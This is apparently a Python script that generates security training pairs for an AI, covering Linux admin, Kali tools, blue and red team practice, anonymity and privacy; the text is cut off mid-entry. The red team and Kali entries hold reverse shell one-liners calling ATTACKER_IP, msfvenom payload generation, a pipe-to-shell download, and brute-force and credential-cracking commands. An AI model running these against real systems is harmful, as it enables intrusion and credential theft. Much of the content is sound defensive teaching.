#!/usr/bin/env python3
"""
Security & Systems Training Data Generator for PlausiDen AI.
Covers: Linux tools, Debian tools, Kali tools, blue team, red team,
anonymity, privacy, and security operations.

Generates high-quality instruction-response pairs for security AI training.
"""

import json
import sys
from pathlib import Path

DEFAULT_OUTPUT = "/home/user/LFI-data/security_training.jsonl"

TRAINING_DATA = []

# ============================================================
# COMMON LINUX TOOLS
# ============================================================
LINUX_TOOLS = [
    # File management
    ("How do I find all files larger than 1GB on the system?",
     "Use `find` with the `-size` flag:\n\n```bash\nfind / -type f -size +1G 2>/dev/null\n```\n\nFor a sorted, human-readable list:\n```bash\nfind / -type f -size +1G -exec ls -lh {} \\; 2>/dev/null | sort -k5 -h -r\n```\n\nTo also show directory sizes:\n```bash\ndu -ah / 2>/dev/null | sort -rh | head -20\n```",
     "linux_tools"),

    ("How do I use awk to extract specific columns from a CSV?",
     "Use `awk` with `-F` to set the delimiter:\n\n```bash\n# Extract columns 1 and 3 from a CSV\nawk -F',' '{print $1, $3}' data.csv\n\n# With custom output separator\nawk -F',' -v OFS='\\t' '{print $1, $3}' data.csv\n\n# Filter rows where column 2 > 100\nawk -F',' '$2 > 100 {print $0}' data.csv\n\n# Sum a numeric column\nawk -F',' '{sum += $2} END {print \"Total:\", sum}' data.csv\n\n# Unique values in column 1\nawk -F',' '!seen[$1]++ {print $1}' data.csv\n```",
     "linux_tools"),

    ("How do I use sed to replace text in multiple files?",
     "```bash\n# Replace in a single file (in-place)\nsed -i 's/old_text/new_text/g' file.txt\n\n# Replace in all .conf files\nfind /etc -name '*.conf' -exec sed -i 's/old/new/g' {} \\;\n\n# Preview changes first (don't modify)\nsed 's/old/new/g' file.txt\n\n# Replace only on lines matching a pattern\nsed '/pattern/s/old/new/g' file.txt\n\n# Delete lines containing a pattern\nsed -i '/pattern_to_delete/d' file.txt\n\n# Insert text after a matching line\nsed -i '/match/a\\new line of text' file.txt\n```\n\n**Always back up before bulk sed operations.**",
     "linux_tools"),

    ("How do I monitor file changes in real time?",
     "Using `inotifywait` from inotify-tools:\n\n```bash\n# Watch a directory for any changes\ninotifywait -m -r /path/to/watch\n\n# Watch for specific events\ninotifywait -m -r -e modify,create,delete /path/to/watch\n\n# Log changes to a file\ninotifywait -m -r -e modify /etc/ --format '%T %w%f %e' --timefmt '%F %T' >> /var/log/file_changes.log\n```\n\nAlternatively, using `entr`:\n```bash\n# Re-run a command when files change\nfind src/ -name '*.rs' | entr cargo test\n\n# Watch and rebuild\nls *.c | entr make\n```",
     "linux_tools"),

    ("How do I use xargs to process items in parallel?",
     "```bash\n# Run commands in parallel (4 at a time)\nfind . -name '*.jpg' | xargs -P4 -I{} convert {} -resize 800x600 resized/{}\n\n# Process lines from a file\ncat urls.txt | xargs -P8 -I{} curl -sO {}\n\n# Handle filenames with spaces\nfind . -name '*.log' -print0 | xargs -0 gzip\n\n# Run with confirmation\nfind . -name '*.tmp' | xargs -p rm\n\n# Limit batch size\nfind . -name '*.py' | xargs -n 10 pylint\n```",
     "linux_tools"),

    ("How do I use tmux for session management?",
     "```bash\n# Create named session\ntmux new -s work\n\n# Detach from session: Ctrl+b d\n\n# List sessions\ntmux ls\n\n# Reattach to session\ntmux attach -t work\n\n# Split panes\n# Horizontal: Ctrl+b %\n# Vertical: Ctrl+b \"\n# Switch panes: Ctrl+b arrow-key\n\n# Create new window: Ctrl+b c\n# Switch windows: Ctrl+b 0-9\n# Rename window: Ctrl+b ,\n\n# Kill session\ntmux kill-session -t work\n\n# Send command to a running session\ntmux send-keys -t work 'cargo test' Enter\n```",
     "linux_tools"),

    ("How do I use strace to debug a program?",
     "```bash\n# Trace all system calls\nstrace ./my_program\n\n# Trace a running process\nstrace -p <PID>\n\n# Only trace file operations\nstrace -e trace=file ./my_program\n\n# Only trace network calls\nstrace -e trace=network ./my_program\n\n# Show timestamps\nstrace -t ./my_program\n\n# Count calls and time spent\nstrace -c ./my_program\n\n# Follow child processes\nstrace -f ./my_program\n\n# Write output to file\nstrace -o trace.log ./my_program\n```\n\n`strace` intercepts all syscalls — great for debugging 'file not found', permission errors, and network issues.",
     "linux_tools"),

    ("How do I use crontab to schedule recurring tasks?",
     "```bash\n# Edit crontab\ncrontab -e\n\n# Format: minute hour day month weekday command\n# Every day at 2am\n0 2 * * * /path/to/backup.sh\n\n# Every 5 minutes\n*/5 * * * * /path/to/check.sh\n\n# Every Monday at 9am\n0 9 * * 1 /path/to/weekly.sh\n\n# First of every month\n0 0 1 * * /path/to/monthly.sh\n\n# List current crontab\ncrontab -l\n\n# Log cron output\n*/5 * * * * /path/to/script.sh >> /var/log/cron-script.log 2>&1\n```\n\n**Tip:** Always use absolute paths in crontab, as the PATH may differ from your shell.",
     "linux_tools"),

    # Process management
    ("How do I use lsof to find what's using a file or port?",
     "```bash\n# Find what process has a file open\nlsof /path/to/file\n\n# Find what's listening on a port\nlsof -i :8080\n\n# Find all network connections for a process\nlsof -i -a -p <PID>\n\n# Find all files open by a user\nlsof -u username\n\n# Find deleted files still held open (reclaim space)\nlsof +L1\n\n# Find processes using a specific directory\nlsof +D /var/log/\n\n# Show all TCP connections\nlsof -i tcp\n\n# Find who's using a mount point (before unmount)\nlsof +D /mnt/usb\n```",
     "linux_tools"),

    ("How do I use journalctl to read systemd logs?",
     "```bash\n# Show all logs\njournalctl\n\n# Follow new logs in real time\njournalctl -f\n\n# Logs for a specific service\njournalctl -u nginx.service\n\n# Logs since a specific time\njournalctl --since '2024-01-15 10:00' --until '2024-01-15 12:00'\n\n# Logs since last boot\njournalctl -b\n\n# Previous boot\njournalctl -b -1\n\n# Only errors and above\njournalctl -p err\n\n# Kernel messages\njournalctl -k\n\n# Show disk usage of logs\njournalctl --disk-usage\n\n# Vacuum old logs (keep 500MB)\njournalctl --vacuum-size=500M\n```",
     "linux_tools"),
]

# ============================================================
# DEBIAN/APT TOOLS
# ============================================================
DEBIAN_TOOLS = [
    ("How do I manage packages with apt on Debian?",
     "```bash\n# Update package lists\nsudo apt update\n\n# Upgrade installed packages\nsudo apt upgrade -y\n\n# Full upgrade (handles dependency changes)\nsudo apt full-upgrade\n\n# Install a package\nsudo apt install nginx\n\n# Remove a package (keep config)\nsudo apt remove nginx\n\n# Remove package AND config\nsudo apt purge nginx\n\n# Remove orphaned dependencies\nsudo apt autoremove\n\n# Search for packages\napt search keyword\n\n# Show package info\napt show nginx\n\n# List installed packages\ndpkg -l | grep nginx\n\n# Find which package provides a file\ndpkg -S /usr/bin/curl\napt-file search filename\n```",
     "debian_tools"),

    ("How do I pin a package version on Debian?",
     "Create a pin file in `/etc/apt/preferences.d/`:\n\n```bash\ncat > /etc/apt/preferences.d/pin-nginx <<'EOF'\nPackage: nginx\nPin: version 1.24.*\nPin-Priority: 1001\nEOF\n```\n\nPriorities:\n- `1001`: Force this version (even downgrades)\n- `990`: Default install behavior\n- `500`: Normal priority\n- `-1`: Never install\n\nTo hold a package at current version:\n```bash\napt-mark hold nginx\napt-mark unhold nginx  # to release\napt-mark showhold  # see held packages\n```",
     "debian_tools"),

    ("How do I check for and install security updates only?",
     "```bash\n# Install unattended-upgrades\nsudo apt install unattended-upgrades\n\n# List security updates only\napt list --upgradable 2>/dev/null | grep -i security\n\n# Install only security updates\nsudo apt upgrade -y -o Dir::Etc::SourceList=/etc/apt/sources.list.d/security.list\n\n# Or use unattended-upgrades\nsudo unattended-upgrades --dry-run  # preview\nsudo unattended-upgrades  # apply\n\n# Enable automatic security updates\nsudo dpkg-reconfigure -plow unattended-upgrades\n```\n\nFor production servers, configure `/etc/apt/apt.conf.d/50unattended-upgrades` to auto-install security patches.",
     "debian_tools"),

    ("How do I manage systemd services?",
     "```bash\n# Start/stop/restart a service\nsudo systemctl start nginx\nsudo systemctl stop nginx\nsudo systemctl restart nginx\nsudo systemctl reload nginx  # reload config without restart\n\n# Enable at boot / disable\nsudo systemctl enable nginx\nsudo systemctl disable nginx\n\n# Check status\nsystemctl status nginx\n\n# List all services\nsystemctl list-units --type=service\nsystemctl list-units --type=service --state=running\nsystemctl list-units --type=service --state=failed\n\n# Show service dependencies\nsystemctl list-dependencies nginx\n\n# Mask a service (prevent starting entirely)\nsudo systemctl mask dangerous-service\nsudo systemctl unmask dangerous-service\n```",
     "debian_tools"),
]

# ============================================================
# KALI LINUX / SECURITY TOOLS
# ============================================================
KALI_TOOLS = [
    ("How do I use nmap for network reconnaissance?",
     "```bash\n# Basic scan (top 1000 ports)\nnmap 192.168.1.0/24\n\n# Full port scan\nnmap -p- 192.168.1.100\n\n# Service version detection\nnmap -sV 192.168.1.100\n\n# OS detection\nnmap -O 192.168.1.100\n\n# Aggressive scan (OS, version, scripts, traceroute)\nnmap -A 192.168.1.100\n\n# Stealth SYN scan\nsudo nmap -sS 192.168.1.100\n\n# UDP scan\nsudo nmap -sU --top-ports 100 192.168.1.100\n\n# Script scan for vulnerabilities\nnmap --script vuln 192.168.1.100\n\n# Output to all formats\nnmap -oA scan_results 192.168.1.100\n\n# Scan timing (0=paranoid to 5=insane)\nnmap -T4 192.168.1.0/24\n```\n\n**Always ensure you have written authorization before scanning.**",
     "kali_tools"),

    ("How do I use Wireshark/tshark for packet analysis?",
     "```bash\n# Capture packets on interface (CLI)\nsudo tshark -i eth0\n\n# Capture with filter\nsudo tshark -i eth0 -f 'port 443'\n\n# Save capture to file\nsudo tshark -i eth0 -w capture.pcap -c 1000\n\n# Read a capture file\ntshark -r capture.pcap\n\n# Display filter (after capture)\ntshark -r capture.pcap -Y 'http.request'\n\n# Extract HTTP URLs\ntshark -r capture.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri\n\n# Show DNS queries\ntshark -r capture.pcap -Y 'dns.qry.name' -T fields -e dns.qry.name\n\n# Follow a TCP stream\ntshark -r capture.pcap -z 'follow,tcp,ascii,0'\n\n# Statistics\ntshark -r capture.pcap -z 'conv,tcp' -q\n```",
     "kali_tools"),

    ("How do I use Burp Suite for web application testing?",
     "```bash\n# Start Burp Suite\nburpsuite &\n\n# Configure browser proxy: 127.0.0.1:8080\n# Or use Burp's embedded browser\n```\n\n**Key features:**\n1. **Proxy** — Intercept and modify HTTP/HTTPS requests\n2. **Scanner** — Automated vulnerability scanning\n3. **Repeater** — Manually craft and replay requests\n4. **Intruder** — Automated payload injection (fuzzing)\n5. **Decoder** — Encode/decode data (Base64, URL, etc.)\n\n**Common workflow:**\n1. Set browser proxy to Burp\n2. Browse target to populate site map\n3. Right-click requests → Send to Repeater/Intruder\n4. Test for SQLi, XSS, auth bypass, IDOR\n5. Use Scanner for automated checks\n\n**Important:** Only test applications you own or have written authorization to test.",
     "kali_tools"),

    ("How do I use hashcat for password cracking?",
     "```bash\n# Identify hash type\nhashid 'hash_value'\n# Or: hash-identifier\n\n# Dictionary attack\nhashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# Hash modes: 0=MD5, 100=SHA1, 1000=NTLM, 1800=SHA-512, 3200=bcrypt\n\n# With rules (hybrid attack)\nhashcat -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule\n\n# Brute force (mask attack)\nhashcat -m 0 hashes.txt -a 3 '?a?a?a?a?a?a?a?a'  # 8-char all chars\n\n# Show cracked passwords\nhashcat -m 0 hashes.txt --show\n\n# Benchmark GPU speed\nhashcat -b\n```\n\n**Masks:** ?l=lowercase, ?u=uppercase, ?d=digit, ?s=special, ?a=all\n**Use ethically** — only crack passwords you own or have authorization to test.",
     "kali_tools"),

    ("How do I use SQLmap for SQL injection testing?",
     "```bash\n# Test a URL parameter\nsqlmap -u 'http://target.com/page?id=1'\n\n# With POST data\nsqlmap -u 'http://target.com/login' --data='user=admin&pass=test'\n\n# Enumerate databases\nsqlmap -u 'http://target.com/page?id=1' --dbs\n\n# Enumerate tables in a database\nsqlmap -u 'http://target.com/page?id=1' -D dbname --tables\n\n# Dump a table\nsqlmap -u 'http://target.com/page?id=1' -D dbname -T users --dump\n\n# Use specific technique\nsqlmap -u URL --technique=BEUST\n# B=Boolean, E=Error, U=Union, S=Stacked, T=Time\n\n# With authentication cookie\nsqlmap -u URL --cookie='session=abc123'\n\n# WAF bypass\nsqlmap -u URL --tamper=space2comment\n```\n\n**Only test with explicit written authorization.**",
     "kali_tools"),

    ("How do I use Metasploit Framework?",
     "```bash\n# Start Metasploit\nmsfconsole\n\n# Search for exploits\nmsf> search type:exploit name:apache\nmsf> search cve:2024\n\n# Use an exploit\nmsf> use exploit/multi/handler\nmsf> set PAYLOAD windows/meterpreter/reverse_tcp\nmsf> set LHOST 192.168.1.100\nmsf> set LPORT 4444\nmsf> exploit\n\n# Information gathering\nmsf> use auxiliary/scanner/portscan/tcp\nmsf> set RHOSTS 192.168.1.0/24\nmsf> run\n\n# Generate payload\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf\n\n# Database integration\nmsf> db_nmap -sV 192.168.1.0/24\nmsf> hosts\nmsf> services\n```\n\n**Metasploit is for authorized penetration testing only.**",
     "kali_tools"),

    ("How do I use gobuster for directory enumeration?",
     "```bash\n# Directory brute-force\ngobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt\n\n# With file extensions\ngobuster dir -u http://target.com -w wordlist.txt -x php,html,txt,bak\n\n# DNS subdomain enumeration\ngobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n\n# VHOST enumeration\ngobuster vhost -u http://target.com -w wordlist.txt\n\n# With threads and status codes\ngobuster dir -u http://target.com -w wordlist.txt -t 50 -s 200,204,301,302\n\n# With authentication\ngobuster dir -u http://target.com -w wordlist.txt -U admin -P password\n```\n\n**Alternative:** `feroxbuster` (Rust, faster, recursive by default)",
     "kali_tools"),

    ("How do I use John the Ripper for password auditing?",
     "```bash\n# Crack Linux shadow file\nsudo unshadow /etc/passwd /etc/shadow > combined.txt\njohn combined.txt\n\n# With specific wordlist\njohn --wordlist=/usr/share/wordlists/rockyou.txt combined.txt\n\n# Specific format\njohn --format=raw-sha256 hashes.txt\n\n# Show cracked passwords\njohn --show combined.txt\n\n# Incremental (brute force) mode\njohn --incremental combined.txt\n\n# Rules-based attack\njohn --wordlist=wordlist.txt --rules combined.txt\n\n# Crack zip file password\nzip2john protected.zip > zip_hash.txt\njohn zip_hash.txt\n\n# Crack SSH key passphrase\nssh2john id_rsa > ssh_hash.txt\njohn ssh_hash.txt\n```",
     "kali_tools"),

    ("How do I use Hydra for brute-force login testing?",
     "```bash\n# SSH brute force\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100\n\n# HTTP POST login form\nhydra -l admin -P wordlist.txt 192.168.1.100 http-post-form \\\n  '/login:username=^USER^&password=^PASS^:Invalid credentials'\n\n# FTP with username list\nhydra -L users.txt -P passwords.txt ftp://192.168.1.100\n\n# RDP\nhydra -l administrator -P wordlist.txt rdp://192.168.1.100\n\n# With rate limiting\nhydra -l admin -P wordlist.txt -t 4 -W 3 ssh://192.168.1.100\n# -t 4 = 4 tasks parallel, -W 3 = 3 second wait between\n```\n\n**Only use against systems you own or have written authorization to test.**",
     "kali_tools"),
]

# ============================================================
# BLUE TEAM (DEFENSE)
# ============================================================
BLUE_TEAM = [
    ("How do I set up intrusion detection with AIDE?",
     "```bash\n# Install AIDE\nsudo apt install aide\n\n# Initialize database\nsudo aideinit\nsudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db\n\n# Check for changes\nsudo aide --check\n\n# Update database after verified changes\nsudo aide --update\nsudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db\n\n# Automate daily checks (cron)\n0 4 * * * /usr/bin/aide --check | mail -s 'AIDE Report' admin@example.com\n```\n\nConfigure `/etc/aide/aide.conf` to monitor critical paths:\n```\n/etc p+i+u+g+sha256\n/usr/bin p+i+u+g+sha256\n/usr/sbin p+i+u+g+sha256\n/boot p+i+u+g+sha256\n!/var/log  # exclude logs\n```",
     "blue_team"),

    ("How do I configure fail2ban to protect SSH?",
     "```bash\n# Install\nsudo apt install fail2ban\n\n# Create local config\nsudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local\n\n# Edit jail.local\n[sshd]\nenabled = true\nport = ssh\nfilter = sshd\nlogpath = /var/log/auth.log\nmaxretry = 3\nbantime = 3600\nfindtime = 600\naction = %(action_mwl)s\n\n# Restart\nsudo systemctl restart fail2ban\n\n# Check status\nsudo fail2ban-client status sshd\n\n# Unban an IP\nsudo fail2ban-client set sshd unbanip 192.168.1.50\n\n# View banned IPs\nsudo fail2ban-client status sshd | grep 'Banned'\n```",
     "blue_team"),

    ("How do I set up Linux audit logging with auditd?",
     "```bash\n# Install\nsudo apt install auditd audispd-plugins\n\n# Add rules to /etc/audit/rules.d/audit.rules\n\n# Monitor file access\n-w /etc/passwd -p wa -k identity_changes\n-w /etc/shadow -p wa -k identity_changes\n-w /etc/sudoers -p wa -k sudo_changes\n\n# Monitor command execution\n-a always,exit -F arch=b64 -S execve -F uid=0 -k root_commands\n\n# Monitor network connections\n-a always,exit -F arch=b64 -S connect -k network_connect\n\n# Load rules\nsudo augenrules --load\n\n# Search audit logs\nausearch -k identity_changes\nausearch -m USER_AUTH --success no  # failed logins\naureport --auth --summary  # authentication summary\n```",
     "blue_team"),

    ("How do I harden SSH configuration?",
     "Edit `/etc/ssh/sshd_config`:\n\n```\n# Disable root login\nPermitRootLogin no\n\n# Disable password authentication (key-only)\nPasswordAuthentication no\nChallengeResponseAuthentication no\n\n# Use strong ciphers only\nCiphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com\nMACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com\nKexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org\n\n# Limit users\nAllowUsers admin deploy\n\n# Set idle timeout\nClientAliveInterval 300\nClientAliveCountMax 2\n\n# Limit authentication attempts\nMaxAuthTries 3\n\n# Use non-standard port\nPort 2222\n\n# Enable 2FA (with libpam-google-authenticator)\n# AuthenticationMethods publickey,keyboard-interactive\n```\n\nThen: `sudo systemctl restart sshd`",
     "blue_team"),

    ("How do I set up network firewall rules with nftables?",
     "```bash\n# Create /etc/nftables.conf\n#!/usr/sbin/nft -f\n\nflush ruleset\n\ntable inet filter {\n    chain input {\n        type filter hook input priority filter; policy drop;\n\n        # Allow established connections\n        ct state established,related accept\n\n        # Allow loopback\n        iifname lo accept\n\n        # Allow SSH\n        tcp dport 22 ct state new accept\n\n        # Allow HTTP/HTTPS\n        tcp dport {80, 443} ct state new accept\n\n        # Allow ICMP (ping)\n        ip protocol icmp accept\n        ip6 nexthdr icmpv6 accept\n\n        # Log and drop everything else\n        log prefix \"nftables-drop: \" counter drop\n    }\n\n    chain forward {\n        type filter hook forward priority filter; policy drop;\n    }\n\n    chain output {\n        type filter hook output priority filter; policy accept;\n    }\n}\n\n# Apply\nsudo nft -f /etc/nftables.conf\nsudo systemctl enable nftables\n```",
     "blue_team"),

    ("How do I scan for rootkits and malware on Linux?",
     "```bash\n# Install scanners\nsudo apt install rkhunter chkrootkit clamav\n\n# Rootkit Hunter\nsudo rkhunter --update\nsudo rkhunter --check --sk\nsudo rkhunter --check --report-warnings-only\n\n# chkrootkit\nsudo chkrootkit\n\n# ClamAV (antivirus)\nsudo freshclam  # update signatures\nsudo clamscan -r /home/  # recursive scan\nsudo clamscan -r --bell -i /  # full system, show infected only\n\n# Check for suspicious SUID binaries\nfind / -perm -4000 -type f 2>/dev/null\n\n# Check for world-writable files\nfind / -perm -002 -type f 2>/dev/null\n\n# Check for processes listening on unexpected ports\nss -tlnp | grep -v -E ':(22|80|443|3000)\\s'\n```",
     "blue_team"),

    ("How do I analyze logs for indicators of compromise?",
     "```bash\n# Failed SSH attempts (brute force indicator)\ngrep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head\n\n# Successful SSH from unusual IPs\ngrep 'Accepted' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn\n\n# Web shell indicators\ngrep -rn 'eval\\|base64_decode\\|system\\|exec\\|passthru' /var/www/\n\n# Unusual cron jobs\nfor user in $(cut -f1 -d: /etc/passwd); do crontab -l -u $user 2>/dev/null; done\n\n# Processes running from /tmp (suspicious)\nls -la /proc/*/exe 2>/dev/null | grep tmp\n\n# Recent file modifications in system directories\nfind /usr/bin /usr/sbin /usr/lib -mtime -1 -type f\n\n# Check for hidden files in web roots\nfind /var/www -name '.*' -type f\n\n# Network connections to known-bad ports\nss -tunp | grep -E ':(4444|5555|1337|31337)\\s'\n```",
     "blue_team"),
]

# ============================================================
# RED TEAM (OFFENSE - authorized testing)
# ============================================================
RED_TEAM = [
    ("How do I perform network enumeration during a pentest?",
     "Systematic enumeration approach:\n\n```bash\n# 1. Host discovery\nnmap -sn 192.168.1.0/24 -oG hosts.txt\n\n# 2. Port scan discovered hosts\nnmap -sV -sC -p- -oA full_scan $(grep 'Up' hosts.txt | cut -d' ' -f2)\n\n# 3. Service enumeration\n# SMB\nenum4linux -a 192.168.1.100\nsmbclient -L //192.168.1.100 -N\n\n# SNMP\nsnmpwalk -c public 192.168.1.100 -v2c\n\n# DNS\ndnsrecon -d target.com\ndig axfr @ns.target.com target.com\n\n# Web\nnikto -h http://192.168.1.100\nwhatweb http://192.168.1.100\n\n# 4. Vulnerability scanning\nnmap --script vuln -p- 192.168.1.100\nsearchsploit apache 2.4\n```\n\n**Document everything in a structured report.**\n**Only perform with written authorization (Rules of Engagement).**",
     "red_team"),

    ("How do I test web application security methodically?",
     "Follow OWASP Testing Guide methodology:\n\n**1. Reconnaissance:**\n```bash\n# Technology fingerprinting\nwhatweb target.com\nwappalyzer target.com\ncurl -sI target.com  # check headers\n```\n\n**2. Input validation testing:**\n```bash\n# SQLi testing\nsqlmap -u 'target.com/page?id=1' --batch\n\n# XSS testing\ndalfox url 'target.com/search?q=test'\n\n# Command injection\n# Test parameters with: ; id, | id, $(id), `id`\n```\n\n**3. Authentication testing:**\n- Default credentials\n- Password policy bypass\n- Session token analysis\n- Rate limiting checks\n\n**4. Authorization testing:**\n- IDOR (change IDs in URLs)\n- Privilege escalation (change role in cookies/tokens)\n- API endpoint access without auth\n\n**5. Business logic:**\n- Price manipulation\n- Race conditions\n- Workflow bypass",
     "red_team"),

    ("How do I set up a reverse shell for authorized testing?",
     "Common reverse shell techniques (authorized testing only):\n\n```bash\n# Listener on attacker machine\nnc -lvnp 4444\n\n# OR with Metasploit\nmsfconsole -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'\n\n# Bash reverse shell (on target)\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n# Python\npython3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'\n\n# Upgrade to interactive TTY\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Then Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm\n```\n\n**Always clean up after testing. Document all access. Only use with written ROE.**",
     "red_team"),

    ("How do I perform privilege escalation enumeration on Linux?",
     "Systematic privesc check:\n\n```bash\n# Current user/groups\nid\ngroups\n\n# Sudo permissions\nsudo -l\n\n# SUID binaries\nfind / -perm -4000 -type f 2>/dev/null\n# Check each against GTFOBins\n\n# World-writable files/dirs\nfind / -writable -type f 2>/dev/null\nfind / -writable -type d 2>/dev/null\n\n# Cron jobs\ncat /etc/crontab\nls -la /etc/cron*\n\n# Running processes as root\nps aux | grep root\n\n# Kernel version (for kernel exploits)\nuname -r\n\n# Environment variables\nenv\ncat /etc/environment\n\n# Network info\nip addr\nss -tlnp\n\n# Automated tools\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n```\n\n**GTFOBins (https://gtfobins.github.io/) is essential for SUID exploitation paths.**",
     "red_team"),
]

# ============================================================
# ANONYMITY
# ============================================================
ANONYMITY = [
    ("How do I route traffic through Tor for anonymity?",
     "```bash\n# Install Tor\nsudo apt install tor\n\n# Start Tor service\nsudo systemctl start tor\n\n# Use with proxychains\nsudo apt install proxychains4\n\n# Configure /etc/proxychains4.conf:\n# dynamic_chain\n# proxy_dns\n# [ProxyList]\n# socks5 127.0.0.1 9050\n\n# Route any command through Tor\nproxychains4 curl ifconfig.me\nproxychains4 nmap -sT -Pn target.com\n\n# Multiple Tor circuits\nfor port in 9050 9052 9054; do\n  echo \"SocksPort $port\" >> /etc/tor/torrc\ndone\nsudo systemctl restart tor\n```\n\n**Important:**\n- Tor only protects network-level anonymity\n- DNS leaks can reveal your identity — use `proxy_dns`\n- Never log into personal accounts over Tor\n- JavaScript can deanonymize — use Tor Browser for web browsing",
     "anonymity"),

    ("How do I remove metadata from files before sharing?",
     "```bash\n# Install exiftool and mat2\nsudo apt install libimage-exiftool-perl mat2\n\n# View metadata\nexiftool photo.jpg\nexiftool document.pdf\n\n# Remove ALL metadata from images\nexiftool -all= photo.jpg\n\n# Remove metadata from PDF\nmat2 document.pdf  # creates document.cleaned.pdf\n\n# Batch remove from all images\nexiftool -all= -r /path/to/images/\n\n# For documents (LibreOffice)\nlibreoffice --headless --convert-to pdf --infilter='writer_pdf_Export:{\"RemoveTransparency\":\"true\"}' document.odt\n\n# Verify metadata removed\nexiftool photo.jpg  # should show minimal/no metadata\n\n# For video files\nffmpeg -i video.mp4 -map_metadata -1 -c copy clean_video.mp4\n```\n\n**Why:** Photos contain GPS coordinates, camera serial numbers, timestamps. Documents contain author names, edit history, software versions.",
     "anonymity"),

    ("How do I spoof my MAC address for network anonymity?",
     "```bash\n# Install macchanger\nsudo apt install macchanger\n\n# View current MAC\nip link show eth0\n\n# Take interface down\nsudo ip link set eth0 down\n\n# Random MAC\nsudo macchanger -r eth0\n\n# Specific vendor MAC\nsudo macchanger -a eth0  # same vendor, random\nsudo macchanger -A eth0  # any vendor, random\n\n# Specific MAC\nsudo macchanger -m XX:XX:XX:XX:XX:XX eth0\n\n# Bring interface back up\nsudo ip link set eth0 up\n\n# Automatic on boot (NetworkManager)\n# /etc/NetworkManager/conf.d/mac.conf:\n[device]\nwifi.scan-rand-mac-address=yes\n[connection]\nwifi.cloned-mac-address=random\nethernet.cloned-mac-address=random\n```\n\n**Note:** MAC is only visible on the local network segment. Once traffic hits a router, MAC is replaced.",
     "anonymity"),
]

# ============================================================
# PRIVACY
# ============================================================
PRIVACY = [
    ("How do I encrypt files and communications with GPG?",
     "```bash\n# Generate a key pair\ngpg --full-generate-key\n# Choose: RSA+RSA, 4096 bits, no expiration or 2 years\n\n# List keys\ngpg --list-keys\ngpg --list-secret-keys\n\n# Export public key (share this)\ngpg --export -a 'Your Name' > my_public_key.asc\n\n# Import someone's public key\ngpg --import their_key.asc\n\n# Encrypt a file for a recipient\ngpg -e -r recipient@email.com secret.txt\n# Creates secret.txt.gpg\n\n# Decrypt\ngpg -d secret.txt.gpg > secret.txt\n\n# Symmetric encryption (password-based)\ngpg -c --cipher-algo AES256 secret.txt\n\n# Sign a file\ngpg --sign --armor file.txt\n\n# Verify signature\ngpg --verify file.txt.asc\n\n# Encrypt and sign\ngpg -se -r recipient@email.com file.txt\n```",
     "privacy"),

    ("How do I set up full-disk encryption on Linux?",
     "Using LUKS (Linux Unified Key Setup):\n\n```bash\n# During installation: select 'encrypted LVM' option\n\n# Post-install encryption of a partition:\n# WARNING: This destroys all data on the partition\nsudo cryptsetup luksFormat /dev/sdb1\nsudo cryptsetup open /dev/sdb1 encrypted_drive\nsudo mkfs.ext4 /dev/mapper/encrypted_drive\nsudo mount /dev/mapper/encrypted_drive /mnt/secure\n\n# Add to /etc/crypttab for auto-unlock at boot\nencrypted_drive /dev/sdb1 none luks\n\n# Add to /etc/fstab\n/dev/mapper/encrypted_drive /mnt/secure ext4 defaults 0 2\n\n# Key management\nsudo cryptsetup luksAddKey /dev/sdb1    # add backup key\nsudo cryptsetup luksRemoveKey /dev/sdb1 # remove a key\nsudo cryptsetup luksDump /dev/sdb1      # show key slots\n\n# Securely erase: just destroy the LUKS header\nsudo cryptsetup luksErase /dev/sdb1\n```\n\n**LUKS + SSD:** Enable TRIM with `allow-discards` option for performance, but be aware this leaks some information about data layout.",
     "privacy"),

    ("How do I configure DNS-over-TLS for private DNS resolution?",
     "Using systemd-resolved:\n\n```bash\n# Edit /etc/systemd/resolved.conf\n[Resolve]\nDNS=1.1.1.1#cloudflare-dns.com 9.9.9.9#dns.quad9.net\nDNSOverTLS=yes\nDNSSEC=yes\nFallbackDNS=\nDomains=~.\n\n# Restart\nsudo systemctl restart systemd-resolved\n\n# Verify\nresolvectl status\nresolvectl query google.com  # should show DoT\n```\n\nAlternatively, using stubby:\n```bash\nsudo apt install stubby\n# Edit /etc/stubby/stubby.yml\n# Set upstream resolvers to DoT endpoints\nsudo systemctl enable stubby\nsudo systemctl start stubby\n# Point /etc/resolv.conf to 127.0.0.1\n```\n\n**Why:** Without encrypted DNS, your ISP (and anyone monitoring the network) can see every domain you visit, even with HTTPS.",
     "privacy"),

    ("How do I set up a VPN with WireGuard?",
